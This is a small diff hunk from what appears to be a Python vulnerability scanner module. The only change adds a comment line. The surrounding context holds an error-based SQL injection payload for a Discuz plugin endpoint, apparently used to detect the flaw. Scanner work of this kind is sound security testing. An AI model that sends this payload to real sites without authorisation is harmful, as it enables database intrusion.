@@ -16,7 +16,7 @@ def UrlProcessing(url):
     else:
         res = urllib.parse.urlparse('http://%s' % url)
     return res.scheme, res.hostname, res.port
-
+#
 payload = "/plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline/**/And/**/1=(UpdateXml(1,ConCat(0x7e,Md5(1234)),1))--"
 def medusa(Url,RandomAgent,ProxyIp):
 
